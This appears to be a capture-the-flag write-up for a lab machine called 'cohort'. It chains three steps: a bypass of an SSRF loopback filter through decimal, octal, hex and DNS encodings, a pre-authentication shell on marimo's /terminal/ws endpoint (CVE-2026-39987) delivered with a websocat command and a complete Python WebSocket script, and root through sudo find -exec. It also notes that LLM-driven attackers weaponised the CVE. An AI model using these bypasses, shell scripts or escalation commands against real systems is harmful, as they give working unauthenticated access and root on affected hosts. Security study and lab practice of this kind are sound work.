Phase 1

SSRF — Bypassing Internal IP Filters

The Validate Source Form

The portal page at /portal.html accepts a "Source URL" and fetches it server-side to validate the data format. It claims to reject internal and loopback addresses — but the filter only checks standard formats.

SSRF filter bypass — decimal IP The application blocks 127.0.0.1, localhost, and 0.0.0.0. But 127.0.0.1 can be represented as the decimal integer 2130706433 (calculated as 127×2²⁴ + 0×2¹⁶ + 0×2⁸ + 1). Most HTTP libraries resolve this correctly, but naive string-based blocklists miss it entirely. 
# Blocked:
http://127.0.0.1:80/          → rejected
http://localhost:80/           → rejected

# Bypass — decimal representation of 127.0.0.1:
http://2130706433:80/          → returns the internal page!

CVE-2026-39987 — marimo Pre-Auth RCE via WebSocket

CVE-2026-39987 explained marimo (pre-0.23.0) has a critical authentication bypass. The main WebSocket endpoint /ws correctly calls validate_auth() before accepting connections. But the terminal endpoint /terminal/ws skips authentication entirely — it only checks the running mode and platform compatibility. Anyone who connects gets a full interactive PTY shell with the privileges of the marimo process. No credentials, no tokens, no session — just open a WebSocket and you're in.

Connect to the unauthenticated terminal WebSocket using websocat:

# Install websocat if needed
$ cargo install websocat
# Or download pre-built binary from GitHub releases

# Connect — no credentials needed
$ websocat ws://127.0.0.1:8888/terminal/ws
devin@cohort:~$

We land as devin — the user running the marimo notebook server.

Alternative: Python WebSocket script If websocat is unavailable, use Python: 
#!/usr/bin/env python3
"""CVE-2026-39987 — marimo /terminal/ws pre-auth shell"""
import asyncio
import websockets
import sys

async def shell():
    uri = "ws://127.0.0.1:8888/terminal/ws"
    async with websockets.connect(uri) as ws:
        async def recv():
            try:
                async for msg in ws:
                    print(msg, end='', flush=True)
            except: pass
        asyncio.create_task(recv())
        while True:
            cmd = await asyncio.get_event_loop().run_in_executor(None, sys.stdin.readline)
            if not cmd: break
            await ws.send(cmd)

asyncio.run(shell())
Phase 4

Privilege Escalation — sudo find

devin@cohort:~$ sudo -l
User devin may run the following commands on cohort:
    (root) NOPASSWD: /usr/bin/find
Why find = root shell find has an -exec flag that runs arbitrary commands for each file found. When run with sudo, those commands execute as root. This is one of the classic GTFOBins entries — no exploit needed, just a single command. 
devin@cohort:~$ sudo /usr/bin/find /tmp -name anything -exec /bin/bash -p \; -quit

# Or more simply:
devin@cohort:~$ sudo /usr/bin/find . -exec /bin/bash \; -quit

root@cohort:~# whoami
root

root@cohort:~# cat /root/root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
GTFOBins reference find is listed on GTFOBins as a sudo escalation vector. Other common entries: vim, python, less, awk, nmap (interactive mode). Always cross-reference sudo -l output against GTFOBins.
Appendix

Key Takeaways

Decimal IP bypasses string-based SSRF filters.

2130706433 = 127.0.0.1. Other bypass formats include octal (017700000001), hex (0x7f000001), IPv6 ([::1]), and DNS rebinding (127.0.0.1.nip.io). Test all of them when an SSRF filter blocks standard loopback addresses.

FastAPI's auto-generated docs expose internal APIs.

/openapi.json and /docs are enabled by default. When reached via SSRF, they reveal every endpoint and parameter — turning a blind SSRF into a fully documented API to exploit.

CVE-2026-39987 is trivial to exploit.

A single WebSocket connection to /terminal/ws gives a full PTY shell. No payload crafting, no injection formatting — just connect. This CVE was weaponized in under 10 hours of public disclosure, with LLM-driven attackers building exploits directly from the advisory.

Internal services are the real attack surface.

The external site was static HTML with no obvious vulnerabilities. All three escalation paths (FastAPI, marimo, sudo) were behind the SSRF. Without the initial SSRF bypass, this machine has no foothold.

sudo find -exec is instant root.

Any command that accepts user-controlled arguments and can spawn subprocesses becomes a root shell when run with sudo. Check GTFOBins for every binary in sudo -l.
